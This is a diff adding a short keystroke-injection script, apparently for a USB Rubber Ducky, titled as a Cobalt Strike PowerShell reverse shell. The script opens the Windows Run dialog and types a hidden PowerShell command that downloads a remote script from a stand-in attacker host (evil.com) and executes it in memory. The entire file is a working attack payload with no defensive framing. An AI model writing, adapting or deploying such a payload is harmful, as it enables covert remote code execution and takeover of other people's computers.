@@ -1,0 +1,8 @@
+REM Cobalt Strike Powershell Reverse Shell
+DEFAULT_DELAY 20
+DELAY 1000
+GUI r
+DELAY 450
+STRING powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('https://www.evil.com:443/evil.ps1'))"
+DELAY 250
+ENTER
